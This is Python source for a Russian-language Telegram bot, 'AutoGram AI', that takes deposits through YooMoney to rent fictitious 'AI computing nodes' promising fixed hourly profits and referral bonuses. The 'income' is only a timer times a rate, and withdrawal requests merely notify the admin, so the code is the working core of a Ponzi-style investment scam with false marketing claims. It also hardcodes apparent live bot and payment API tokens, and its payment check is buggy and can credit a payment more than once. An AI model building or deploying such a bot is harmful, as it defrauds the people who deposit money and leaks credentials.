import asyncio
import sqlite3
import time
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, CommandObject
from aiogram.utils.keyboard import InlineKeyboardBuilder
from yoomoney import Quickpay, Client

# --- КОНФИГУРАЦИЯ ---
BOT_TOKEN = "8800941405:AAH0TZbP48M5grkVxZ-tvP7lxK72eTSg4yc"
YOOMONEY_TOKEN = "5133D1719448E2A5E1083A0FC605E369944CBB992B1D4490F13E2D4636C03191"
YOOMONEY_WALLET = "4100118935779591"
ADMIN_ID = 12345678  # Твой ID
MIN_WITHDRAW = 3000

# ТАРИФЫ: [Название, Цена, Доход в час, Эмодзи]
TARIFS = {
    "node_1": ["Starter AI", 1000, 12.5, "🥉"],   # 300₽/сутки
    "node_2": ["Advanced Neural", 5000, 75.0, "🥈"], # 1800₽/сутки
    "node_3": ["Quantum Core", 15000, 275.0, "🥇"]  # 6600₽/сутки
}

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
yoomoney_client = Client(YOOMONEY_TOKEN)

# --- БАЗА ДАННЫХ (Оптимизированная) ---
def db_query(sql, params=(), fetch=False):
    with sqlite3.connect("autogram_premium.db") as conn:
        cur = conn.cursor()
        cur.execute(sql, params)
        return cur.fetchall() if fetch else conn.commit()

def init_db():
    db_query("""CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY, balance REAL DEFAULT 0, ref_id INTEGER,
        node_1 INTEGER DEFAULT 0, node_2 INTEGER DEFAULT 0, node_3 INTEGER DEFAULT 0,
        last_tick INTEGER DEFAULT 0
    )""")

# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---
def get_user(user_id):
    res = db_query("SELECT balance, node_1, node_2, node_3, last_tick, ref_id FROM users WHERE id = ?", (user_id,), True)
    if not res:
        db_query("INSERT INTO users (id, last_tick) VALUES (?, ?)", (user_id, int(time.time())))
        return (0, 0, 0, 0, int(time.time()), None)
    return res[0]

def calc_income(u):
    # u = (balance, n1, n2, n3, last_tick, ref_id)
    now = int(time.time())
    hours = (now - u[4]) / 3600
    hourly_rate = (u[1]*TARIFS["node_1"][2]) + (u[2]*TARIFS["node_2"][2]) + (u[3]*TARIFS["node_3"][2])
    return round(hours * hourly_rate, 2), now

# --- КЛАВИАТУРЫ ---
def main_kb():
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="💎 ЛИЧНЫЙ КАБИНЕТ", callback_data="cabinet"))
    builder.row(
        types.InlineKeyboardButton(text="🛒 МАГАЗИН", callback_data="shop"),
        types.InlineKeyboardButton(text="👥 ПАРТНЕРЫ", callback_data="refs")
    )
    builder.row(types.InlineKeyboardButton(text="ℹ️ О СИСТЕМЕ", callback_data="info"))
    return builder.as_markup()

# --- ОБРАБОТЧИКИ ---

@dp.message(Command("start"))
async def start(message: types.Message, command: CommandObject):
    u = get_user(message.from_user.id)
    if command.args and command.args.isdigit() and not u[5] and int(command.args) != message.from_user.id:
        db_query("UPDATE users SET ref_id = ? WHERE id = ?", (int(command.args), message.from_user.id))

    text = (
        "<b>🤖 AUTOGRAM AI — ВАША СТАНЦИЯ ПРИБЫЛИ</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Это полностью автоматизированная система заработка на базе нейросетевых вычислений.\n\n"
        "✅ <b>Зарабатывайте 24/7</b> без вашего участия.\n"
        "✅ <b>Моментальный вывод</b> от 3,000₽.\n"
        "✅ <b>Прозрачная статистика</b> и надежная защита.\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "<i>Начните свой путь к пассивному доходу прямо сейчас!</i>"
    )
    await message.answer(text, parse_mode="HTML", reply_markup=main_kb())

@dp.callback_query(F.data == "cabinet")
async def cabinet(callback: types.CallbackQuery):
    await callback.answer()
    u = get_user(callback.from_user.id)
    pending, _ = calc_income(u)
    
    text = (
        "<b>💼 ЛИЧНЫЙ КАБИНЕТ</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"💳 Мой баланс: <b>{round(u[0], 2)} ₽</b>\n"
        f"⏳ Накоплено: <b>{pending} ₽</b>\n\n"
        f"<b>Активные мощности:</b>\n"
        f"└ {TARIFS['node_1'][3]} v1: {u[1]} | {TARIFS['node_2'][3]} v2: {u[2]} | {TARIFS['node_3'][3]} v3: {u[3]}\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"<i>Минимальный вывод: {MIN_WITHDRAW}₽</i>"
    )
    kb = InlineKeyboardBuilder()
    kb.row(types.InlineKeyboardButton(text="📥 СОБРАТЬ ПРИБЫЛЬ", callback_data="collect"))
    kb.row(
        types.InlineKeyboardButton(text="➕ ПОПОЛНИТЬ", callback_data="dep"),
        types.InlineKeyboardButton(text="💸 ВЫВОД", callback_data="withdraw")
    )
    kb.row(types.InlineKeyboardButton(text="⬅️ НАЗАД", callback_data="home"))
    await callback.message.edit_text(text, parse_mode="HTML", reply_markup=kb.as_markup())

@dp.callback_query(F.data == "collect")
async def collect(callback: types.CallbackQuery):
    u = get_user(callback.from_user.id)
    pending, now = calc_income(u)
    
    if pending < 0.5:
        return await callback.answer("⚠️ Минимальный сбор от 0.5 ₽", show_alert=True)
    
    db_query("UPDATE users SET balance = balance + ?, last_tick = ? WHERE id = ?", (pending, now, callback.from_user.id))
    
    if u[5]: # Рефералка 10%
        bonus = pending * 0.10
        db_query("UPDATE users SET balance = balance + ? WHERE id = ?", (bonus, u[5]))
        try: await bot.send_message(u[5], f"📈 <b>Партнерский бонус!</b>\nНачислено: +{round(bonus, 2)}₽")
        except: pass

    await callback.answer(f"✅ Собрано: {pending}₽", show_alert=True)
    await cabinet(callback)

@dp.callback_query(F.data == "shop")
async def shop(callback: types.CallbackQuery):
    await callback.answer()
    text = "<b>🛒 МАГАЗИН ВЫЧИСЛИТЕЛЬНЫХ УЗЛОВ</b>\n\n<i>Арендуйте мощности AI для генерации прибыли:</i>"
    kb = InlineKeyboardBuilder()
    for k, v in TARIFS.items():
        kb.row(types.InlineKeyboardButton(text=f"{v[3]} {v[0]} — {v[1]}₽ ({v[2]}₽/ч)", callback_data=f"buy_{k}"))
    kb.row(types.InlineKeyboardButton(text="⬅️ НАЗАД", callback_data="home"))
    await callback.message.edit_text(text, parse_mode="HTML", reply_markup=kb.as_markup())

@dp.callback_query(F.data.startswith("buy_"))
async def buy(callback: types.CallbackQuery):
    key = callback.data.replace("buy_", "")
    u = get_user(callback.from_user.id)
    price = TARIFS[key][1]
    
    if u[0] < price:
        return await callback.answer("❌ Недостаточно средств на балансе!", show_alert=True)
    
    db_query(f"UPDATE users SET balance = balance - ?, {key} = {key} + 1 WHERE id = ?", (price, callback.from_user.id))
    await callback.answer(f"🚀 {TARIFS[key][0]} успешно запущен!", show_alert=True)
    await shop(callback)

@dp.callback_query(F.data == "dep")
async def deposit(callback: types.CallbackQuery):
    await callback.answer()
    # Пример на 1000 руб, можно сделать выбор сумм кнопками
    label = f"d_{callback.from_user.id}_{int(time.time())}"
    qp = Quickpay(receiver=YOOMONEY_WALLET, quickpay_form="shop", targets="AutoGram AI", paymentType="SB", sum=1000, label=label)
    
    kb = InlineKeyboardBuilder()
    kb.row(types.InlineKeyboardButton(text="💳 ОПЛАТИТЬ 1000₽", url=qp.base_url))
    kb.row(types.InlineKeyboardButton(text="🔄 ПРОВЕРИТЬ ОПЛАТУ", callback_data=f"check_{label}"))
    await callback.message.answer("<b>💳 ПОПОЛНЕНИЕ БАЛАНСА</b>\n\nНажмите кнопку ниже для оплаты:", parse_mode="HTML", reply_markup=kb.as_markup())

@dp.callback_query(F.data.startswith("check_"))
async def check(callback: types.CallbackQuery):
    label = callback.data.split("_")[1]
    # Ускоренная проверка
    await callback.answer("⏳ Синхронизация с банком...")
    history = yoomoney_client.operation_history(label=label)
    if history.operations and history.operations[-1].status == "success":
        db_query("UPDATE users SET balance = balance + ? WHERE id = ?", (history.operations[-1].amount, callback.from_user.id))
        await callback.message.answer("✅ <b>Оплата принята!</b> Баланс обновлен.")
    else:
        await callback.answer("❌ Платеж еще не подтвержден.", show_alert=True)

@dp.callback_query(F.data == "withdraw")
async def withdraw(callback: types.CallbackQuery):
    u = get_user(callback.from_user.id)
    if u[0] < MIN_WITHDRAW:
        return await callback.answer(f"⚠️ Минимальный вывод: {MIN_WITHDRAW}₽", show_alert=True)
    
    await callback.answer()
    await callback.message.answer("📝 <b>Заявка на вывод</b>\n\nНапишите ваш номер карты и сумму:")
    await bot.send_message(ADMIN_ID, f"🔔 <b>НОВАЯ ЗАЯВКА</b>\nID: {callback.from_user.id}\nБаланс: {u[0]}₽")

@dp.callback_query(F.data == "home")
async def home(callback: types.CallbackQuery):
    await callback.answer()
    await start(callback.message, CommandObject(command="start", args=None))

async def main():
    init_db()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
